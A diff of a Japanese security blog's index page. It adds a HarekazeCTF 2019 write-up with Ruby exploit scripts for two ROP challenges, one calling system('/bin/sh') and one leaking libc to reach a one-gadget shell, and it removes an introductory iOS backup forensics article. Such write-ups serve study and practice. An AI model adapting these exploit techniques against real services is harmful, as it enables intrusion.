@@ -106,6 +106,105 @@
 <article>
   <header class="Heading">
   <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/harekazectf2019/" rel="bookmark">Harekazectf2019</a>
+  </h2>
+  
+  <time datetime="2019-05-19T16:54:53&#43;09:00">
+    19 May, 2019
+  </time>
+  
+</header>
+  
+
+<h2 id="baby-rop-1">Baby ROP 1</h2>
+
+<ul>
+<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ
+```ruby
+#!/usr/bin/env ruby</li>
+</ul>
+
+<p>require &lsquo;pwn&rsquo;</p>
+
+<p>context.log_level = :debug
+z = Sock.new &ldquo;problem.harekaze.com&rdquo;, 20001</p>
+
+<p>pop_rdi_ret = p64(0x00400683)
+system = p64(0x4005e3)</p>
+
+<p>STDIN.gets
+z.recvuntil &ldquo;? &ldquo;
+payload = &ldquo;A&rdquo; * 24
+payload &lt;&lt; pop_rdi_ret
+payload &lt;&lt; p64(0x601048)
+payload &lt;&lt; system</p>
+
+<p>z.sendline payload</p>
+
+<p>z.interact</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">- **HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}**
+
+## Baby ROP 2
+
+- `system` 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ
+```ruby
+#!/usr/bin/env ruby
+
+require &#39;pwn&#39;
+
+context.log_level = :debug
+z = Sock.new &#34;problem.harekaze.com&#34;, 20005
+#z = Sock.new &#34;localhost&#34;, 9999
+elf = ELF.new &#34;./babyrop2&#34;
+libc = ELF.new &#34;./libc.so.6&#34;
+#libc = ELF.new &#34;./mylibc.so.6&#34;
+
+pop_rdi_ret = p64(0x00400733)
+z.recvuntil &#34;? &#34;
+
+payload = &#34;A&#34; * 40
+payload &lt;&lt; pop_rdi_ret
+payload &lt;&lt; p64(elf.got[&#34;__libc_start_main&#34;])
+payload &lt;&lt; p64(0x4004f0)
+payload &lt;&lt; p64(elf.symbols[&#34;main&#34;])
+STDIN.gets
+z.sendline payload
+
+recvlen = &#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&#34;.length
+data = z.recvuntil &#34;? &#34;
+p data
+libc_base = u64(data[recvlen, 6].ljust(8, &#34;\x00&#34;)) - libc.symbols[&#34;__libc_start_main&#34;]
+libc_magic = libc_base + 0xf02a4
+puts &#34;libc base 0x%x&#34; % libc_base
+puts &#34;libc magic 0x%x&#34; % libc_magic
+
+payload = &#34;B&#34; * 40
+payload &lt;&lt; p64(libc_magic)
+z.sendline payload
+
+z.interact</pre></div>
+<ul>
+<li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
+</ul>
+
+<h2 id="login">Login</h2>
+
+<ul>
+<li>解けなかった、脆弱性わからず</li>
+</ul>
+
+<h2 id="harekaze-note">Harekaze Note</h2>
+
+<ul>
+<li>Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず</li>
+</ul>
+
+  
+</article>
+
+<article>
+  <header class="Heading">
+  <h2 class="Heading-title">
     <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/terraform_for_conoha/" rel="bookmark">Terraform でConoha のインスタンスを立ててみる</a>
   </h2>
   
@@ -1189,129 +1288,6 @@ highlight_file(<span style="color:#ba2121">&#39;index.php&#39;</span>);
 <h2 id="おわりに">おわりに</h2>
 
 <p>binarycookiesファイル解析ツールbincookieの宣伝をしました。binarycookiesファイルを解析する際には、ぜひbincookie使ってみてください。バグか何かあったらissueやPR待ってます。</p>
-
-  
-<footer>
-  <ul class="Tags">
-    
-    
-    
-    <li class="Tags-item u-background">
-      <a class="Tags-link u-clickable" href="https://owlinux1000.github.io/blog/tags/mobile/" rel="tag">mobile</a>
-    </li>
-    
-    
-  </ul>
-</footer>
-
-</article>
-
-<article>
-  <header class="Heading">
-  <h2 class="Heading-title">
-    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/an_introduction_of_ios_forensics/" rel="bookmark">iOSデバイスフォレンジック入門</a>
-  </h2>
-  
-  <time datetime="2019-02-28T21:00:00&#43;09:00">
-    28 February, 2019
-  </time>
-  
-</header>
-  
-
-<h2 id="はじめに">はじめに</h2>
-
-<p>本記事では、<strong>iOSフォレンジックをやったことない</strong>人向けに基本的な情報をまとめてみました。取っ掛かりとしては簡単に読める内容だと思います。主にiOSデバイスのバックアップデータやその解析ツールについてご紹介しています。</p>
-
-<h2 id="準備">準備</h2>
-
-<p>本記事では主に以下のデバイスやソフトウェアを使って検証しています。当該デバイスやバージョンでない場合同じ結果や解釈にならない可能性もありますのでご了承ください。</p>
-
-<ul>
-<li>iPad mini4 (iOS 12.1.1 非Jailbreak)</li>
-<li>MacBookPro (High Sierra 10.13.6)</li>
-<li>iTunes (12.8.3)</li>
-</ul>
-
-<h2 id="ios-概要">iOS 概要</h2>
-
-<p>iOSは、iPhoneやiPad、Apple Watch等で利用されているOSです。iOSは大きく分けて、以下の4つのシステムから構成されています。</p>
-
-<ul>
-<li>Cocoa Touch</li>
-<li>Media</li>
-<li>Cocoa Service</li>
-<li>Core OS</li>
-</ul>
-
-<p>Cocoa Touchは、名前からもわかるようにタッチ操作を始めとするユーザーインタフェースのシステムです。Mediaは、動画像や音楽などMedia用のシステムです。Cocoa Serviceは、アプリケーションにとって必要な基本的なシステムを提供しています。最後のCore OSは、ハードウェアに近いより低レイヤーなネットワークやメモリ管理、スレッドの機能などを提供しています。</p>
-
-<p>次に、iOSで用いられているファイルシステムについて簡単にご紹介いたします。近年のiOSではAPFS（Apple File System）と呼ばれるファイルシステムが利用されています。従来はHFS、HFS+が使われていましたが、2017年のiOS 10.3からAPFSが導入されました。APFSの特徴としては、inodeが64bitに拡張されたためより多くのファイルが扱えるようになったり、CoW（Copy on Write）のサポート、タイムスタンプがナノ秒単位まで記録するようになったりなど従来のファイルシステムに比べ大きく変わっています。より詳細な情報としては以下のWebページなどが参考になると思います。</p>
-
-<ul>
-<li><a href="https://ja.wikipedia.org/wiki/Apple_File_System">Apple File System</a></li>
-<li><a href="https://cyberforensic.focus-s.com/knowledge/articles_detail/356/">ファイルシステムがAPFSになった事による変更点</a></li>
-</ul>
-
-<h2 id="itunesバックアップ">iTunesバックアップ</h2>
-
-<p>iOSデバイスにおけるデータを抽出する方法としては、物理と論理の2通りの方法があります。しかしながら、物理デバイスから情報を抽出するためには、機材が必要であったり、論理面でも有償のツールが必要なことが多く入門には不向きです。そこで本記事では、iTunesのバックアップデータを元にiOSデバイスのフォレンジック調査に役立つ情報をまとめていこうと思います。もしすでにホストマシンにiTunesを用いてバックアップをとっている人はそのデータをお使いできます。もしなければ、iOSデバイスを接続し、iTunesの画面よりバックアップをとってください。</p>
-
-<p>iOSデバイスのバックアップデータは、以下の場所に格納されます。</p>
-
-<ul>
-<li>Mac：<code>/User/ユーザ名/Library/Application Support/MobileSync/Backup</code></li>
-<li>Windows：<code>\AppData\Roaming\Apple Computer\MobileSync\Backup\</code></li>
-<li>Windowsストアアプリ経由でiTunesを入れた場合：<code>%USERPROFILE%\Apple\MobileSync\Backup</code></li>
-</ul>
-
-<p>バックアップを行っている状態で、上記フォルダにアクセスするとハッシュ値が名前のフォルダがあると思います。それがバックアップデータの本体です。バックアップデータのフォルダの中には、主に以下のファイルやフォルダが格納されていると思います。</p>
-
-<ul>
-<li>Manifest.plist</li>
-<li>Manifest.db</li>
-<li>Info.plist</li>
-<li>Status.plist</li>
-<li>大量のフォルダ</li>
-</ul>
-
-<p>Manifest.plistは、主にバックアップの内容について記載されています。例えばバックアップした日時、バックアップを暗号化しているかどうか、インストールしたアプリケーション一覧などがあげられます。Manifest.dbは、SQLiteのデータベースファイルで、バックアップデータに含まれるファイルやフォルダの情報が格納してあります。<code>fileID</code>カラムには、SHA1が格納されており、これはファイル名を表しています。そのため、バックアップフォルダの中で、このハッシュ値を使って検索したりします。<br />
-以下の図は、DB Browser for SQLiteでManifest.dbを読み込んだときの図です。CUIのsqlite3コマンドなどでも良いのですが、フォレンジック業務をやるときには、フィルターやソート、検索などが手軽に使えるほうが効率が良いので、こういったGUIツールを使っています。</p>
-
-<p><img src="https://imgur.com/download/2PzjpVu" alt="Manifest.db" /></p>
-
-<p>Info.plistは、主にバックアップ対象のデバイス情報について記載されています。例えば、IMEIやシリアルナンバー、最後にバックアップした日などが挙げられます。Status.plistは、主にバックアップ状況について記載されています。</p>
-
-<p>バックアップフォルダの中に格納されている主要なアーティファクトは、SANSの公開資料の<a href="https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf">DFIR-Smartphone-Forensics-Poster.pdf</a> に掲載されています。とても便利なのでダウンロードしておくことをおすすめします。</p>
-
-<h2 id="itunesバックアップ解析ツール">iTunesバックアップ解析ツール</h2>
-
-<p>今まで見てきたバックアップデータなどを解析する際に役立つツールをご紹介します。</p>
-
-<h3 id="plutil">plutil</h3>
-
-<p>拡張子plistのバイナリファイルの中身を解析する際には、<code>plutil</code>コマンドが便利です。Macの場合は標準でインストールされているのですぐに使えます。Windowsでは、<a href="https://www.icopybot.com/plist-editor.htm">plist Editor Pro for Windows</a>というものが存在するので、それを利用できそうです（未検証）。</p>
-
-<p>本来<code>plutil</code>コマンドはいろいろな操作ができますが、今回はフォレンジックでよく使うplistファイルを別のファイルに変換する操作をご紹介します。以下は、<code>Info.plist</code>ファイルをxmlファイルに変換する場合の例です。plistファイルはバイナリファイルなので、こういった変換を行うことが必要となってきます。</p>
-<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ plutil -t convert xml1 Info.plist -o Info.xml</pre></div>
-<p><code>-o</code>オプションを忘れてしまうとplistファイル自体の中身が書き換わってしまうので注意してください。<br />
-その他Pythonが利用できる環境であれば、<code>plistlib</code>ライブラリが利用できるので、これを用いてプログラマブルに解析することも可能です。</p>
-
-<h3 id="iexplorer">iExplorer</h3>
-
-<p><img src="https://imgur.com/download/Aogfu9Z" alt="iExplorer" /></p>
-
-<p>iExplorerは、高機能なiOSデバイスファイルブラウザーです。<a href="https://macroplant.com/iexplorer">iExplorer</a> よりダウンロードできます。iExplorerは、Manifest.dbなどの情報を自動でパースし、より人間にわかりやすい形で表示してくれます。正直これがあれば、バックアップデータの閲覧には困らないと思います。全体的に眺めたい際などは、こちらを使って足りない場合、前述した<code>plutil</code>コマンドなどを使って解析します。同様のツールとして<code>iBackupBot</code>や<code>iBackup Viewer</code>などがあるので、使い比べてみて自分にあったものを使うと良いでしょう。</p>
-
-<h2 id="おわりに">おわりに</h2>
-
-<p>今回は、iOSの基本構造やバックアップデータを用いた解析方法などについて簡単にご紹介しました。次は、気が向けば個々のアーティファクトについてより詳細にとりあげて記事を今度書こうかなと思っています。</p>
-
-<h2 id="参考資料">参考資料</h2>
-
-<ul>
-<li><a href="https://www.packtpub.com/networking-and-servers/practical-mobile-forensics-third-edition">Practical Mobile Forensics - Third Edition</a></li>
-</ul>
 
   
 <footer>
